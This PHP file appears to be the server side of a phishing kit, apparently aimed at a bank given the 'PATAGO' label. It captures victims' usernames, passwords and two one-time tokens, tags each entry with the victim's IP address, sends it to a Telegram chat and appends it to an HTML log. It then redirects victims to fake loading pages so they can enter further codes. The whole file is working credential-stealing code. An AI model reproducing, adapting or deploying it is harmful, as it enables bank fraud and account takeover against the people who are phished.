<?php
include '../config.php';
include './tg.php';
date_default_timezone_set($timezone);
$ip = $_SERVER['REMOTE_ADDR']; 

if (isset($_POST['docasma'])) {
  $msg  = "➖➖➖[ PATAGO ]➖➖➖\r\n";
  $msg .= "✔️ USR : <code>{$_POST['docasma']}</code>\r\n";
  $msg .= "✔️ PSWD : <code>{$_POST['doras']}</code>\r\n";
  $msg .= "➖➖➖ INFO ➖➖➖\r\n";
  $msg .= "🌐 IP : <code>".$ip."</code>\r\n";
  $msg .= "➖➖➖[@savitarhh]➖➖➖\r\n\r\n\r\n";
  if ($txt == true){
    $f = fopen("./../$txtn.html", "a"); 
    fwrite ($f, '
    <div style="font-family:arial">
    USR: [<b><font color="#EE0707">'.$_POST['usrtag'].'</font></b>]<br>
    PSWD: [<b><font color="#EE0707">'.$_POST['usrtag'].'</font></b>]<br>
    IP: [<b><font color="#4EE811">'.$ip.'</font></b>]<br>
    '.date("d/m/Y H:i").'<br>
    --------------------
    </div>');
    fclose($f);
  }
  if($tg == true){
  sendTg($msg, $key, $id);
  }
  header("location: ./../cargando.php");
}
if (isset($_POST['tok'])) {
  $msg  = "➖➖➖[ PATAGO ]➖➖➖\r\n";
  $msg .= "✔️ TOKEN : <code>{$_POST['tok']}</code>\r\n";
  $msg .= "➖➖➖ INFO ➖➖➖\r\n";
  $msg .= "🌐 IP : <code>".$ip."</code>\r\n";
  $msg .= "➖➖➖[@savitarhh]➖➖➖\r\n\r\n\r\n";
  if ($txt == true){
    $f = fopen("./../$txtn.html", "a"); 
    fwrite ($f, '
    <div style="font-family:arial">
    TOKEN: [<b><font color="#EE0707">'.$_POST['tok'].'</font></b>]<br>
    IP: [<b><font color="#4EE811">'.$ip.'</font></b>]<br>
    '.date("d/m/Y H:i").'<br>
    --------------------
    </div>');
    fclose($f);
  }
  if($tg == true){
  sendTg($msg, $key, $id);
  }
  header("location: ./../cargando2.php");
}
if (isset($_POST['tok2'])) {
  $msg  = "➖➖➖[ PATAGO ]➖➖➖\r\n";
  $msg .= "✔️ TOKEN2 : <code>{$_POST['tok2']}</code>\r\n";
  $msg .= "➖➖➖ INFO ➖➖➖\r\n";
  $msg .= "🌐 IP : <code>".$ip."</code>\r\n";
  $msg .= "➖➖➖[@savitarhh]➖➖➖\r\n\r\n\r\n";
  if ($txt == true){
    $f = fopen("./../$txtn.html", "a"); 
    fwrite ($f, '
    <div style="font-family:arial">
    TOKEN2: [<b><font color="#EE0707">'.$_POST['tok'].'</font></b>]<br>
    IP: [<b><font color="#4EE811">'.$ip.'</font></b>]<br>
    '.date("d/m/Y H:i").'<br>
    --------------------
    </div>');
    fclose($f);
  }
  if($tg == true){
  sendTg($msg, $key, $id);
  }
  header("location: $out");
}
?>